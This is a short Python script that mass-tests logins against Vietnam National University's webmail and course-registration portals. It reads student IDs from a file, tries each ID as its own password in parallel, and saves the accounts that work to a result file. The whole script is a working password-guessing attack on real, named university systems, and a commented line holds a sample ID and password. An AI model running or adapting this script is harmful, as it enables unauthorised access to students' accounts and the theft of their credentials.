#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import requests
from multiprocessing import Pool 

MAX_THREADS = 10
URL_LOGIN = {
	'UET' : 'http://ctmail.vnu.edu.vn/webmail/src/redirect.php',
	'UEB' : 'http://mail.vnu.edu.vn/webmail/src/redirect_dothechuan.php',
}

URL_LOGIN_VNU = 'http://112.137.128.121/dang-nhap'
# URL_LOGIN_VNU = 'http://dangkyhoc.vnu.edu.vn/dang-nhap'

# return username if login successfully elae None
def login_vnudaotao(username, password=None):
	password = password or username
	sess = requests.session()	
	#get token
	match = re.search( '__RequestVerificationToken" type="hidden" value="(.*?)"',
						sess.get(URL_LOGIN_VNU).text)
	if not match:
		return None
	token = match.group(1)		
	#post data
	data = {
		'__RequestVerificationToken' : token,
		'loginName' : username,
		'password' : password,
	}

	response = sess.post(URL_LOGIN_VNU, data=data).content
	if 'Logout' in response:			
		return username
	return None


#login http://ctmail.vnu.edu.vn
def login_vnumail(url_login, username, password=None):
	if not password:
		if ' ' in username:
			username, password = username.split(' ')
		else:
			password = username

	_data = {
		'login_username' : username,
		'secretkey' : password,
		'js_autodetect_results' : 1,
		'just_logged_in' : 1,
	}

	_referer = re.search('(http.*?vn/)', url_login).group(1) + 'webmail/src/login.php'
	response = requests.post(url_login, data=_data, headers={'referer': _referer}).content
	if (not 'Tên đăng nhập hay mật khẩu không đúng' in response):
		print '*'
		return username + ' ' + password
	else:
		return None

def login_uetmail(username, password=None):
	return login_vnumail(URL_LOGIN['UET'], username, password)


def claw_mail(function_login, file_lists):
	list_ids = open(file_lists).read().splitlines()
	# range_id = [(i,i) for i in list_ids]
	p = Pool(MAX_THREADS)
	clawed = p.map(function_login, list_ids)
	# Remove failed
	filter_clawed = filter(lambda a: a != None, clawed)
	return filter_clawed

# print login_vnu('15020907', 'deadp00l')

if __name__ == '__main__':
	# print login_uetmail('bacnb_k58 13020023')
	ids = claw_mail(login_vnudaotao, 'listids_uet.txt')
	ids = '\n'.join(ids)
	open('result_uet_daotao.txt', 'w').write(ids)